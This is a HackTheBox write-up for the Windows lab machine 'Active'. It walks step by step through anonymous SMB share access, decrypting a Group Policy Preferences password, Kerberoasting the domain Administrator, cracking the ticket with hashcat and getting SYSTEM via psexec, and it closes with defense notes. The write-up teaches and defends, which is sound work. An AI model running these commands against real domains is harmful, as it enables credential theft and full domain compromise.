---
TitleSEO:    "HackTheBox Active Writeup — Kerberoasting AD | ZureFX"
TitlePost:   "HTB Active — Easy Windows"
Author:      "ZureFX"
Description: "Full writeup for HackTheBox Active. SMB anonymous share enumeration, GPP password decryption with gpp-decrypt, and Kerberoasting the Administrator account to get SYSTEM."
Keywords:    "hackthebox, active, writeup, kerberoasting, gpp, smb, active directory, windows, easy"
URL:         "https://zurefx.github.io/writeups/htb-active.html"
URL_IMAGES:  "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-active/"
Date:        "2026-03-25"
Tags:        "HackTheBox, Easy, Windows, Kerberoasting, GPP, SMB, ActiveDirectory"
Section:     "writeups"
Lang:        "en"
main_img:    "htb-active"
Permalink:   "/writeups/htb-active.html"
BtnLabel:    "Read Writeup"
Pick:        1
---

## Overview

Active is an Easy-rated Windows machine on HackTheBox that covers two classic Active Directory attack techniques: **GPP (Group Policy Preferences) password exposure** and **Kerberoasting**. Both are real-world vulnerabilities still found in enterprise environments today. The box is a perfect introduction to AD pentesting fundamentals.

**Key techniques:** SMB anonymous access, GPP password decryption, Kerberoasting, hash cracking with Hashcat.

---

## Enumeration

### Port Scan

Starting with a full TCP port scan using nmap:

```bash
nmap -p- --min-rate 5000 -oN nmap_full.txt 10.10.10.100
```

Relevant open ports:

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds  Windows Server 2008 R2 SP1
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
49152/tcp open  msrpc
49153/tcp open  msrpc
49154/tcp open  msrpc
49155/tcp open  msrpc
49157/tcp open  ncacn_http
49158/tcp open  msrpc
```

The presence of ports 53, 88, 389, and 3268 immediately signals a **Domain Controller**. The hostname from nmap is `active.htb`.

### SMB Enumeration

Checking for anonymous SMB access:

```bash
smbclient -L //10.10.10.100 -N
```

Output:

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
Replication     Disk
SYSVOL          Disk      Logon server share
Users           Disk
```

The `Replication` share is non-standard and accessible without credentials. Let's dig in:

```bash
smbclient //10.10.10.100/Replication -N
```

```
smb: \> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  active.htb                          D        0  Sat Jul 21 06:37:44 2018
```

Recursively downloading everything:

```bash
smbclient //10.10.10.100/Replication -N -c "recurse ON; prompt OFF; mget *"
```

After downloading, the directory structure mirrors a SYSVOL share — this is a domain replication artifact. Browsing the downloaded files:

```
active.htb/
└── Policies/
    └── {31B2F340-016D-11D2-945F-00C04FB984F9}/
        ├── GPT.INI
        └── MACHINE/
            ├── Microsoft/
            │   └── Windows NT/
            │       └── SecEdit/
            │           └── GptTmpl.inf
            └── Preferences/
                └── Groups/
                    └── Groups.xml
```

---

## Foothold — GPP Password Decryption

### Finding the Encrypted Password

Inside `Groups.xml` there is a Group Policy Preferences entry for a local user:

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"
        name="active.htb\SVC_TGS"
        image="2"
        changed="2018-07-18 20:46:06"
        uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
    <Properties
      action="U"
      newName=""
      fullName=""
      description=""
      cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
      changeLogon="0"
      noChange="1"
      neverExpires="1"
      acctDisabled="0"
      userName="active.htb\SVC_TGS"/>
  </User>
</Groups>
```

The `cpassword` field is a GPP-encrypted password. Microsoft published the AES-256 key used to encrypt these passwords back in 2012 in their documentation — meaning **anyone** with access to this file can decrypt it.

### Decrypting with gpp-decrypt

```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

Result:

```
GPPstillStandingStrong2k18
```

We now have valid domain credentials:

- **Username:** `active.htb\SVC_TGS`
- **Password:** `GPPstillStandingStrong2k18`

### Verifying Credentials

```bash
crackmapexec smb 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18
```

```
SMB  10.10.10.100  445  DC  [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
```

Valid. Now let's grab the user flag from the Users share:

```bash
smbclient //10.10.10.100/Users -U SVC_TGS%GPPstillStandingStrong2k18 \
  -c "get SVC_TGS/Desktop/user.txt /tmp/user.txt"
cat /tmp/user.txt
```

---

## Privilege Escalation — Kerberoasting

### What is Kerberoasting?

Any authenticated domain user can request a **Ticket Granting Service (TGS)** ticket for any Service Principal Name (SPN) registered in the domain. The TGS ticket is encrypted with the **NTLM hash of the service account's password**. Since we receive the encrypted ticket, we can attempt to crack it offline without any detection on the domain controller.

The attack steps are:
1. Enumerate SPNs in the domain.
2. Request TGS tickets for those SPNs.
3. Extract the encrypted portion of the tickets.
4. Crack offline with Hashcat.

### Enumerating SPNs

```bash
impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 \
  -dc-ip 10.10.10.100 \
  -request
```

Output:

```
ServicePrincipalName  Name           MemberOf  PasswordLastSet             LastLogon
--------------------  -------------  --------  --------------------------  --------------------------
active/CIFS:445       Administrator             2018-07-18 15:06:40.351723  2018-07-30 17:17:40.656520

$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS:445*$6abe1d29f34cde...
[HASH TRUNCATED FOR READABILITY]
```

The **Administrator** account has an SPN registered — which is unusual and a misconfiguration. This means we can Kerberoast the domain Administrator directly.

### Cracking the Hash

Save the full hash to a file:

```bash
echo "$krb5tgs\$23\$*Administrator..." > admin.kerberoast
```

Run Hashcat with mode `13100` (Kerberos 5 TGS-REP etype 23):

```bash
hashcat -m 13100 admin.kerberoast /usr/share/wordlists/rockyou.txt \
  --force \
  -O
```

Hashcat output:

```
$krb5tgs$23$*Administrator...[HASH]...:Ticketmaster1968

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS:445*...
Time.Started.....: Mon Mar 25 12:14:07 2026 (8 secs)
Speed.#1.........:  1234.5 kH/s
Recovered........: 1/1 (100.00%) Digests
```

**Administrator password:** `Ticketmaster1968`

### Getting SYSTEM

```bash
impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100
```

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliates

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file xKmBqrIp.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service BTIS on 10.10.10.100.....
[*] Starting service BTIS.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

Root flag at `C:\Users\Administrator\Desktop\root.txt`.

---

## Why GPP Passwords Still Work

Microsoft deprecated GPP password storage in **MS14-025** (2014), but the patch only prevents creating **new** GPP entries with passwords. It does **not** remove or encrypt existing ones. Organizations that haven't audited their SYSVOL since before 2014 will still have these files present and readable by any domain user.

This is why during real engagements it is always worth running:

```bash
# Check for GPP passwords in SYSVOL
crackmapexec smb <dc-ip> -u <user> -p <pass> -M gpp_password
crackmapexec smb <dc-ip> -u <user> -p <pass> -M gpp_autologin
```

---

## Defense Notes

| Technique         | Detection / Mitigation                                              |
|-------------------|---------------------------------------------------------------------|
| GPP passwords     | Audit SYSVOL for Groups.xml with cpassword. Patch MS14-025.        |
| Anonymous SMB     | Disable null sessions. Restrict share permissions.                 |
| Kerberoasting     | Use MSA/gMSA for service accounts. Set 25+ char random passwords.  |
| Weak SPN accounts | Audit SPNs with `Get-ADUser -Filter * -Properties ServicePrincipalName`. |

---

## Tools Used

- `nmap` — port scanning
- `smbclient` — SMB enumeration and file download
- `gpp-decrypt` — GPP AES decryption
- `crackmapexec` — credential validation
- `impacket-GetUserSPNs` — Kerberoasting
- `hashcat` — offline hash cracking
- `impacket-psexec` — remote code execution